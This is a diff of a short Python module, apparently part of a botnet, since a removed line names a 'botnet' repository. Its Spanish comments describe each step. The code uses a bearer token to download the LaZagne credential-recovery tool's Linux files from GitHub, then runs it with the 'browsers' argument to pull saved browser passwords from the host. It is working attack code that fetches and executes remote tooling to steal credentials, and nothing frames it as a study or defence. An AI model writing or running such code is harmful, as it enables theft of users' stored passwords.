@@ -1,33 +1,34 @@
 import subprocess
 import requests
 import base64
+import os
 
 def downloadFile(urlb, token):
     print('[!] Descargando ' + urlb)
-    sha = None
-    content = None
     headers = {
         'Authorization': 'Bearer ' + token
     }
     res = requests.get(urlb, headers=headers).json()
-    if 'sha' in res and 'content' in res:
-        sha = res['sha']
-        base64_bytes = base64.b64decode(res['content'])
-        content = base64_bytes.decode('utf-8')
-        with open('laZagne.py', 'w') as f:
-            f.write(content)
+    if isinstance(res, list):  # Si la respuesta es una lista, significa que es un directorio
+        for file_info in res:
+            if file_info['type'] == 'file':  # Si es un archivo, lo descargamos
+                download_url = file_info['download_url']
+                file_content = requests.get(download_url).content
+                with open(os.path.join('Linux', file_info['name']), 'wb') as f:
+                    f.write(file_content)
     else:
         print('[-] ' + res.get('message', 'Error desconocido'))
-    return sha, content
 
 def run(token):
-    #urlb = "https://api.github.com/repos/Pol-Ruiz/botnet/contents/laZagne.py"
-    urlb = "https://github.com/AlessandroZ/LaZagne/contents/Linux/"
+    urlb = "https://api.github.com/repos/AlessandroZ/LaZagne/contents/Linux/"
     
-    # Descargar el archivo
+    # Crear la carpeta si no existe
+    if not os.path.exists('Linux'):
+        os.makedirs('Linux')
+
+    # Descargar el directorio
     downloadFile(urlb, token)
     
     # Ejecutar el archivo con el argumento "all"
-    subprocess.run(["python3", 'laZagne.py', "browsers"], check=True)
-
+    subprocess.run(["python3", os.path.join('Linux', 'laZagne.py'), "browsers"], check=True)
 
